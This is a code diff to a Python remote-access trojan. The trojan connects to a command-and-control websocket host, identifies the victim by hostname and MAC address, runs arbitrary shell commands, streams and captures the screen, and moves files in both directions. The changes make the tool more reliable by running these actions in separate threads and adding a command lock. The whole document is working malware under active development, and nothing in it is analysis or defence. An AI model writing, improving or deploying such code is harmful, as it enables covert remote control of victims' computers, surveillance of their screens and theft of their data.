@@ -16,7 +16,6 @@ from PIL import ImageGrab
 
 CURRENT_CWD = os.getcwd()
 
-# Unique hardware ID for session grouping
 try:
     MAC = uuid.getnode()
     HARDWARE_ID = f"{MAC:012x}"
@@ -27,6 +26,7 @@ C2_URL = "wss://textgame-9-c2.fly.dev/shell"
 SESSION_ID = f"rs-{socket.gethostname()}-{HARDWARE_ID}"
 
 STREAM_EVENT = threading.Event()
+CMD_LOCK = threading.Lock()
 
 def send(ws, obj):
     try:
@@ -59,8 +59,8 @@ def stream_screen(ws):
     except Exception:
         pass
     finally:
-        STREAM_EVENT.set()
-        send(ws, {"t": "reply", "data": "[-] Stream stopped.\n"})
+        # Do not clear the event here, let the command handler do it
+        pass
 
 def run_cmd(ws, cmd):
     global CURRENT_CWD
@@ -102,7 +102,7 @@ def run_cmd(ws, cmd):
                 stderr=subprocess.STDOUT
             )
             
-        out, _ = proc.communicate(timeout=60)
+        out, _ = proc.communicate(timeout=30)
         text = out.decode("utf-8", errors="ignore")
         if not text:
             text = f"[exit {proc.returncode}, no output]"
@@ -111,7 +111,7 @@ def run_cmd(ws, cmd):
         
     except subprocess.TimeoutExpired:
         proc.kill()
-        send(ws, {"t": "reply", "data": "[timeout 60s]\n"})
+        send(ws, {"t": "reply", "data": "[timeout 30s]\n"})
     except Exception as e:
         send(ws, {"t": "reply", "data": f"[exec error] {e}\n"})
 
@@ -165,22 +165,33 @@ def main():
                     
                 t = frame.get("t")
                 if t == "cmd":
-                    cmd = frame.get("cmd", "")
-                    if "stopstream" in cmd:
+                    cmd = frame.get("cmd", "").strip()
+                    
+                    if cmd == "stopstream":
                         STREAM_EVENT.set()
-                    elif "stream" in cmd:
+                    elif cmd == "stream":
                         if not STREAM_EVENT.is_set():
                             STREAM_EVENT.set() 
                             time.sleep(0.2)
                         threading.Thread(target=stream_screen, args=(ws,), daemon=True).start()
-                    elif "screenshot" in cmd:
-                        do_screenshot(ws)
+                    elif cmd == "screenshot":
+                        threading.Thread(target=do_screenshot, args=(ws,), daemon=True).start()
                     else:
-                        threading.Thread(target=run_cmd, args=(ws, cmd), daemon=True).start()
+                        # Prevent command execution from blocking the socket
+                        def threaded_cmd():
+                            if CMD_LOCK.acquire(blocking=False):
+                                try:
+                                    run_cmd(ws, cmd)
+                                finally:
+                                    CMD_LOCK.release()
+                            else:
+                                send(ws, {"t": "reply", "data": "[-] Command busy, try again.\n"})
+                        threading.Thread(target=threaded_cmd, daemon=True).start()
+                        
                 elif t == "upload":
-                    do_upload(ws, frame.get("path"), frame.get("data"))
+                    threading.Thread(target=do_upload, args=(ws, frame.get("path"), frame.get("data")), daemon=True).start()
                 elif t == "download":
-                    do_download(ws, frame.get("path"))
+                    threading.Thread(target=do_download, args=(ws, frame.get("path")), daemon=True).start()
                     
         except Exception as e:
             print(f"[-] {e}; retry 5s")
